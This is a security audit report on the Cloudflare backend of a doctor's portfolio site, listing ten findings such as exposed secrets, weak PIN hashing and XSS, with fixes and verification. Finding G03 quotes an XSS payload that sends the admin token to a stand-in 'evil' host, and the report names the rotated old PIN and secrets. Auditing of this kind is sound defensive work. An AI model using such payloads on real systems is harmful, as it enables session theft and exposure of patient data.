# AUDIT-ROUND-3.md — Dr. Sumya Pervin Portfolio (post-migration)

**Date:** 2026-07-28
**Scope:** the Cloudflare Pages/D1/R2 backend introduced in `7851663`, plus deployment surfaces.
**Why this round exists:** Rounds 1 and 2 audited the Express backend. That backend was deleted in the migration, so neither round covers any code currently running. `FIXPLAN.md` nonetheless declared the project "fully applied," which is how the findings below survived to production.

---

## Executive Summary

The migration was architecturally sound — D1 + R2 + Pages is the right shape for this site, and the endpoint layout is clean. The defects are all in the details of the port, and two of them were live on the public internet.

Ten findings: 4 critical, 3 high, 3 medium. All code-level findings are fixed. One containment item requires the owner.

---

## Findings Table

| ID | Severity | Area | Status |
|---|---|---|---|
| G01 | Critical | Public repo-root exposure of credentials | Fixed (owner action outstanding) |
| G02 | Critical | `JWT_SECRET` fallback constant | Fixed |
| G03 | Critical | Unauthenticated stored XSS into admin panel | Fixed |
| G04 | Critical | Unsalted single-round SHA-256 PIN | Fixed |
| G05 | High | `SITE_SECRET` fallback + broken query parsing | Fixed |
| G06 | High | Booking flow reports success on failure | Fixed |
| G07 | High | Attacker-controlled content-type on R2 uploads | Fixed |
| G08 | Medium | Unescaped attribute contexts in gallery render | Fixed |
| G09 | Medium | Public booking path depended on an authenticated route | Fixed |
| G10 | Medium | Unguarded `request.json()` → 500s; silent catches | Fixed |

---

## Detailed Findings

### G01 — Public repo-root exposure of credentials (Critical)

`wrangler.toml` set `pages_build_output_dir = "."`, and the live Netlify deployment used the repo root as its publish directory. Verified live: `/migrations/001_schema.sql` (admin PIN hash), `/wrangler.toml` (`SITE_SECRET` plaintext), `/agent.md` and `/HANDOFF-2026-07-28.md` (the PIN in plaintext prose), and all of `/functions/**`. Real content-types and content-lengths, not an SPA fallback. A stray `python3 -m http.server 8085` bound to `0.0.0.0` served the same set on the LAN.

**Fix:** site moved to `public/`; `pages_build_output_dir` scoped to it; `netlify.toml` added so an accidental redeploy fails closed; LAN server killed. Verified sensitive paths return 404 with no secret strings in any body.

**Outstanding:** the Netlify site must be unpublished by the owner. Credentials are compromised regardless and were rotated.

### G02 — `JWT_SECRET` fallback constant (Critical)

`functions/lib/auth.js` used `env.JWT_SECRET || 'fallback-dev-secret'`. With `JWT_SECRET` unset the API did not fail — it signed valid 24-hour admin tokens with a constant that was, per G01, publicly downloadable. The prior handoff documented this as "login returns 500," which is the opposite of what the code did.

Compounding it: the documented deploy step was `wrangler secret put`, the **Workers** command, a no-op for Pages; and `JWT_SECRET` was declared under `[vars]`, which ships plaintext and overwrites dashboard values on deploy. Three independent paths to the same unset-secret state.

**Fix:** `getSecret` throws when `JWT_SECRET` is missing or empty. `[vars]` block removed. Runbook corrected to `wrangler pages secret put`.

### G03 — Unauthenticated stored XSS into the admin panel (Critical)

`public/js/main.js` interpolated `${app.appointment_date}` unescaped — the one field on that line whose neighbours all used the existing `escapeHTML` helper. Server-side, `POST /api/appointments` checked only that the field was present, and that endpoint is public by design.

An attacker posts a booking whose `appointment_date` is `<img src=x onerror="fetch('//evil/'+localStorage.cms_token)">`. It executes when Dr. Pervin opens her CMS, exfiltrating the admin JWT and with it every patient's name, phone, and notes.

**Fix:** escaped the interpolation, and added `YYYY-MM-DD` validation plus length caps server-side. Also escaped `status`, `created_at`, and the WhatsApp href on the same template.

### G04 — Unsalted single-round SHA-256 PIN (Critical)

`migrations/001_schema.sql` and the runtime seeder both stored `SHA-256(pin)` with no salt and no iteration — rainbow-table trivial for a short PIN, and the plaintext was written in three tracked files.

**Fix:** PBKDF2-SHA256, 100k iterations, per-install salt in a new `pin_salt` column. Rotation generates a fresh salt. Constant-time comparison. The runtime seeder was deleted outright — a seeder that invents a default PIN is a backdoor, and it cost a D1 read on every request. Minimum PIN length of 8 enforced on change.

### G05 — `SITE_SECRET` fallback and broken query parsing (High)

`functions/api/contact.js` fell back to the literal `'portfoliosumyapervin'`, so the contact-message list had a hardcoded access code — one that G01 published. The gate also parsed the secret with `url.split('?from=')[1]`, which returns the wrong value for any URL carrying more than one query parameter and silently mis-compares.

**Fix:** no fallback (500 if unconfigured), `searchParams` parsing, constant-time compare. Secret rotated.

### G06 — Booking flow reports success on failure (High)

On an API error the handler fabricated `bookingId = 'book-' + Date.now()` and the UI still rendered *"Your appointment request has been saved on the server."*

Because Netlify cannot run Pages Functions, `/api/appointments` 404'd there — so on the live public site this fired on **every** booking. Every patient who booked was told their appointment was saved. None were. In a medical context a patient can act on that and travel to a chamber for an appointment that does not exist.

This regresses `UX-AUDIT.md`'s "Lying success states" finding, which Round 2 had marked resolved.

**Fix:** explicit failure state that tells the patient the booking was not recorded, keeps their form populated, and offers the direct-contact fallback. No fabricated reference numbers.

### G07 — Attacker-controlled content-type on R2 uploads (High)

Gallery upload derived the file extension from the user's filename and the stored `contentType` from `file.type`, and `/api/uploads/:filename` served it back on the site's own origin with that type. An uploaded `.html` or `.svg` became same-origin script execution against `cms_token`. No size cap either.

**Fix:** MIME allowlist (JPEG/PNG/WebP), extension derived from the validated MIME, 2 MB cap, and `X-Content-Type-Options: nosniff` + `Content-Disposition: inline` on the response. Unrecognised stored types are pinned to `application/octet-stream`.

### G08 — Unescaped attribute contexts in gallery render (Medium)

`<img src="${item.image_path}" alt="${item.title}">` and `${capitalize(item.category)}` were interpolated raw, while `title` was correctly escaped two lines below in the `<h4>`. `category` had no server-side enum check. Writes are auth-gated, so exploitation needs the admin token — but the result persists to every public visitor.

**Fix:** escaped all three; `category` restricted to the enum the UI filters on (`clinical`, `procedures`, `clinic`); `image_path` restricted to `http(s):` or `/api/uploads/` so `javascript:` cannot reach an `img src`.

### G09 — Public booking path depended on an authenticated route (Medium)

`loadCMSConfig()` fetched `GET /api/config` to get the doctor's WhatsApp number, but that route sits behind `requireAuth`. Anonymous visitors got 401, the catch reset `whatsapp` to `''`, and the button linked to `https://wa.me/?text=…` — nowhere. Since no notification mechanism exists, the forward is how the practice learns about bookings; post-migration it was dead for everyone except the logged-in admin. It passed testing because testing was done while logged in.

**Fix:** new `GET /api/config/public` returning only the two published contact handles. The nav phone number and floating WhatsApp button — both previously hardcoded to the placeholder `+880 1700-000000` / `wa.me/8801700000000` — now populate from it and stay hidden until a real number is configured.

### G10 — Unguarded JSON parsing and silent catches (Medium)

`await request.json()` was unguarded in four handlers, so a malformed body threw an unhandled 500. `config.js` dereferenced `row.whatsapp` with no null check. `_middleware.js` wrapped the seeder in `catch {}`, and the R2 delete swallowed failures, silently orphaning objects. CORS was `*` on authenticated routes.

**Fix:** shared `readJson` helper returning 400; null checks; R2 delete failures logged; CORS scoped to `ALLOWED_ORIGIN`.

---

## What's Actually Good

- The endpoint layout is clean and conventional; `[id].js` / `index.js` routing is used correctly.
- Every D1 query was already parameterised — no SQL injection anywhere, including in the pre-fix code.
- `escapeHTML` existed and was used correctly in most places; the XSS holes were omissions, not an absent defence.
- Deleting the Express backend rather than leaving it alongside was the right call.
- R2 for images rather than committing binaries is the right shape.

---

## Deliberate Non-Findings

- **`onclick="deleteCMSItem('${item.id}')"`** — IDs are server-generated from `crypto.randomUUID()`, so they cannot contain quotes. Left as-is.
- **Quiz recommendation `innerHTML`** — inputs come from `data-` attributes in static markup, not from user or DB data. No injection path.
- **`innerHTML` generally** — the codebase renders through it throughout. Every interpolation is now escaped. Converting to DOM construction is a worthwhile refactor but is not a security fix, and doing it under time pressure risks introducing bugs.

---

## Verification Performed

Run against `wrangler pages dev public --local` with a real `JWT_SECRET`:

- Old PIN `talhatheboss` → 401. New PIN → token. No token → 401.
- Token forged with the old `fallback-dev-secret` constant → 401.
- Old `SITE_SECRET` → 403. New secret with a preceding query param (`?a=1&from=…`) → 200, proving the parse fix.
- `appointment_date` XSS payload → 400. Valid date → 201. `2026-13-45` → 400.
- Gallery `category` injection → 400. `javascript:` `image_path` → 400. Valid item → 201.
- `.html` and `.svg` uploads → 400. PNG → 201, served as `image/png` with `nosniff`.
- `/api/config/public` → 200 anonymously; `/api/config` → 401 anonymously.
- PIN change: too short → 400; wrong current PIN → 401.
- Sensitive paths (`/migrations/*`, `/wrangler.toml`, `/.dev.vars`, `/agent.md`, `/functions/**`) → 404 with zero secret strings in any response body. Site and API paths → 200.

**Not verified end-to-end:** the browser-side rendering of the escaped fields and the booking failure UI were checked by code inspection and syntax validation, not by driving a real browser. Worth confirming visually before deploy.
